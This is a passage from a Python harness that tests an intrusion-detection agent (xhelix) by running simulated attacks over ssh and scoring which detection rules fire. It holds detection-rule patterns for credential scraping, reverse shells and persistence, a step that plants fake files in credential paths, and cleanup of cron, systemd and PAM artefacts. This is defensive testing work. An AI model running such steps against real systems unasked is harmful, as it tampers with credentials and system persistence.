                ["ssh", "-o", "ConnectTimeout=5", HOST,
                 "pkill -f 'beacon|revshell|exfil|curl' 2>/dev/null; true"],
                capture_output=True, timeout=10)
        except Exception: pass
    # parse rule_ids from the tail output
    alerts = []
    for line in out.splitlines():
        line = line.strip()
        if not line: continue
        try:
            d = json.loads(line)
            ev = d.get("event", {})
            alerts.append((d.get("rule_id","(none)"), ev.get("comm",""), ev.get("image","")))
        except: pass
    # Skip the older flow:

    pat = re.compile(test["expect_rule"])
    matched = sum(1 for r, c, im in alerts if pat.search(r))
    total = len(alerts)
    noise = total - matched
    elapsed = time.time() - t0

    # For FP tests: PASS if no matched alerts attributable to this test
    if test["category"] == "FP":
        # FP test passes if no attack-class rule fired
        # Count attack-class rules that fired during window
        attack_classes = re.compile(r"credbroker\.plaintext|cred_proc_scrape|mem_mprotect|memfd|kernel_module|bpf_syscall|any_ptrace|shell_with_socket|tls_no_sni|honey|cron_new_unit|ssh_key_added|ld_so_preload|binary_runs_from_tmp|suid_binary|web_server_spawns|fim\.drift|deleted_binary")
        attack_fired = sum(1 for r, c, im in alerts if attack_classes.search(r))
        # exclude background known noise
        bg_pat = re.compile(r"^(cred_proc_scrape|deleted_binary_running|fim\.drift)$")
        bg_only = sum(1 for r, c, im in alerts if bg_pat.search(r))
        actual_fp = attack_fired - bg_only
        status = "PASS" if actual_fp <= 0 else "FAIL"
        debug_fh.write(f"[{test['id']}] FP test: attack_fired={attack_fired} bg_only={bg_only} actual_fp={actual_fp}\n")
        return {**test, "status": status, "matched": 0, "noise": total, "fp_signal": actual_fp, "duration": elapsed, "started_at": started_at}

    # Attack tests: PASS if expected rule fired
    if matched > 0:
        status = "PASS"
    else:
        # Check if test is for a NO-RULE-WIRED detector
        no_rule_set = {"raw_socket", "dns_exfil|dga", r"raw_socket|unexpected_listener"}
        if test["expect_rule"] in no_rule_set or "raw_socket" in test["expect_rule"] or "dns_exfil" in test["expect_rule"]:
            status = "NO-RULE"
        else:
            status = "FAIL"

    debug_fh.write(f"[{test['id']}] {test['desc']}: matched={matched} noise={noise} status={status}\n")
    debug_fh.write(f"  rules in window: {Counter(a[0] for a in alerts).most_common(10)}\n")
    debug_fh.flush()

    return {**test, "status": status, "matched": matched, "noise": noise, "duration": elapsed, "started_at": started_at}

def main():
    print("=" * 60)
    print(f"MEGA BATTERY v3 — {datetime.now().isoformat()}")
    print(f"Prod host: {HOST}   C2: {C2_IP}")
    print("=" * 60)

    # Load prior PASS results to skip them in this re-run.
    PASS_CSV = os.environ.get("SKIP_FROM",
        os.path.join(DIR, "mega-results-pass1.csv"))
    skip_ids = set()
    if os.path.exists(PASS_CSV):
        with open(PASS_CSV) as f:
            r = csv.DictReader(f)
            for row in r:
                if row.get("status") == "PASS":
                    skip_ids.add(row["id"])
        print(f"\n[skip-list] {len(skip_ids)} tests already PASSed in {os.path.basename(PASS_CSV)} — will NOT re-run")

    # Build all tests
    all_tests = []
    all_tests += gen_credential_tests()
    all_tests += gen_persistence_tests()
    all_tests += gen_memory_tests()
    all_tests += gen_c2_tests()
    all_tests += gen_dataleak_tests()
    all_tests += gen_exploit_tests()
    all_tests += gen_fp_tests()

    # Filter out already-passed
    before = len(all_tests)
    all_tests = [t for t in all_tests if t["id"] not in skip_ids]
    print(f"[filter] {before} total tests → {len(all_tests)} to run after skip-list\n")

    print(f"\nTotal tests: {len(all_tests)}")
    cat_counts = Counter(t["category"] for t in all_tests)
    for cat, n in cat_counts.most_common():
        print(f"  {cat:<12} {n}")

    # Setup: seed credentials, ensure honey exists, restart xhelix for fangate
    print("\n[setup] seeding credential files + ensuring honey + restart xhelix...")
    seed = "; ".join([
        "mkdir -p /root/.aws /root/.azure /root/.config/gcloud /root/.config/gh /root/.config/op /root/.docker /root/.kube",
        "for p in /root/.aws/credentials /root/.aws/config /root/.azure/credentials /root/.config/gcloud/credentials.db /root/.npmrc /root/.pypirc /root/.docker/config.json /root/.kube/config /root/.git-credentials /root/.netrc /root/.config/gh/hosts.yml /root/.config/op/config /etc/psa/.psa.shadow /root/.my.cnf; do [ -f $p ] || echo 'fake-cred-content-for-test' > $p; done",
        "mkdir -p /etc/xhelix/sealed && touch /etc/xhelix/sealed/test.honey",
        "systemctl restart xhelix && sleep 12"
    ])
    ssh(seed, timeout=60)
    print("[setup] done")

    # Run tests
    results = []
    fh_dbg = open(DEBUG_LOG, "w")
    with open(RESULTS_CSV, "w") as f:
        w = csv.DictWriter(f, fieldnames=["id","category","desc","detector","expect_rule","status","matched","noise","duration","started_at"])
        w.writeheader()
        for idx, test in enumerate(all_tests):
            sys.stdout.write(f"\r[{idx+1}/{len(all_tests)}] {test['id']:<10} {test['category']:<12} {test['desc'][:50]:<50}  ")
            sys.stdout.flush()
            r = run_test(test, fh_dbg)
            results.append(r)
            w.writerow({k: r.get(k) for k in ["id","category","desc","detector","expect_rule","status","matched","noise","duration","started_at"]})
            f.flush()
            status_color = {"PASS":"\033[32m","FAIL":"\033[31m","NO-RULE":"\033[33m"}.get(r["status"],"")
            sys.stdout.write(f"{status_color}{r['status']:<8}\033[0m  (matched={r['matched']:>3})\n")
            sys.stdout.flush()
    fh_dbg.close()

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    total = len(results)
    pass_n = sum(1 for r in results if r["status"] == "PASS")
    fail_n = sum(1 for r in results if r["status"] == "FAIL")
    nrule_n = sum(1 for r in results if r["status"] == "NO-RULE")
    print(f"\nTotal: {total}")
    print(f"  PASS:    {pass_n} ({100*pass_n//total}%)")
    print(f"  FAIL:    {fail_n} ({100*fail_n//total}%)")
    print(f"  NO-RULE: {nrule_n} ({100*nrule_n//total}%)")

    print(f"\nPer-category:")
    cat_pass = defaultdict(int); cat_tot = defaultdict(int); cat_fp = defaultdict(int)
    for r in results:
        cat_tot[r["category"]] += 1
        if r["status"] == "PASS": cat_pass[r["category"]] += 1
        if r["category"] == "FP" and r["status"] == "FAIL":
            cat_fp[r["category"]] += 1
    for cat in sorted(cat_tot):
        p, t = cat_pass[cat], cat_tot[cat]
        pct = 100*p//t if t else 0
        bar = "█"*(pct//5) + "░"*(20 - pct//5)
        print(f"  {cat:<13} {p:>4}/{t:<4}  {pct:>3}%  {bar}")

    # Per-detector
    print(f"\nPer-detector:")
    det_pass = defaultdict(int); det_tot = defaultdict(int)
    for r in results:
        det_tot[r["detector"]] += 1
        if r["status"] == "PASS": det_pass[r["detector"]] += 1
    for det in sorted(det_tot):
        p, t = det_pass[det], det_tot[det]
        pct = 100*p//t if t else 0
        print(f"  {det:<25} {p:>4}/{t:<4}  {pct:>3}%")

    # Save summary
    with open(SUMMARY_MD, "w") as f:
        f.write(f"# Mega battery — {datetime.now().isoformat()}\n\n")
        f.write(f"Total tests: {total}  ")
        f.write(f"PASS: {pass_n} ({100*pass_n//total}%) | ")
        f.write(f"FAIL: {fail_n} ({100*fail_n//total}%) | ")
        f.write(f"NO-RULE: {nrule_n} ({100*nrule_n//total}%)\n\n")
        f.write("## Per-category\n\n| Category | PASS | TOTAL | % |\n|---|---|---|---|\n")
        for cat in sorted(cat_tot):
            f.write(f"| {cat} | {cat_pass[cat]} | {cat_tot[cat]} | {100*cat_pass[cat]//cat_tot[cat]}% |\n")
        f.write("\n## Per-detector\n\n| Detector | PASS | TOTAL | % |\n|---|---|---|---|\n")
        for det in sorted(det_tot):
            f.write(f"| {det} | {det_pass[det]} | {det_tot[det]} | {100*det_pass[det]//det_tot[det]}% |\n")

    # Cleanup
    print("\n[cleanup] removing test artifacts...")
    cleanup = "; ".join([
        "rm -f /root/.aws/credentials /root/.aws/config /root/.azure/credentials",
        "rm -f /root/.config/gcloud/credentials.db /root/.npmrc /root/.pypirc",
        "rm -f /root/.docker/config.json /root/.kube/config /root/.git-credentials",
        "rm -f /root/.netrc /root/.config/gh/hosts.yml /root/.config/op/config",
        "rm -f /etc/psa/.psa.shadow /root/.my.cnf",
        "rm -f /tmp/.tt-* /tmp/.dd-* /tmp/dl-* /tmp/.akb /tmp/.lsp.bak /tmp/suid-* /dev/shm/.dd-*",
        "rm -f /etc/cron.d/test-* /etc/cron.hourly/test-* /etc/cron.daily/test-*",
        "rm -f /etc/cron.weekly/test-* /var/spool/cron/crontabs/.testu*",
        "rm -f /etc/systemd/system/xtest*.service /etc/systemd/system/xtest*.timer",
        "rm -f /etc/profile.d/test*.sh /etc/rc.d/init.d/test*",
        "rm -f /etc/ld.so.conf.d/test*.conf /lib/security/test*.so",
        "rm -f /etc/xdg/autostart/test*.desktop /etc/pam.d/test*",
        "rm -f /root/.bashrc.test* /root/.profile.test*",
    ])
    ssh(cleanup, timeout=30)

    print(f"\nResults: {RESULTS_CSV}")
    print(f"Summary: {SUMMARY_MD}")
    print(f"Debug:   {DEBUG_LOG}")

if __name__ == "__main__":
    main()
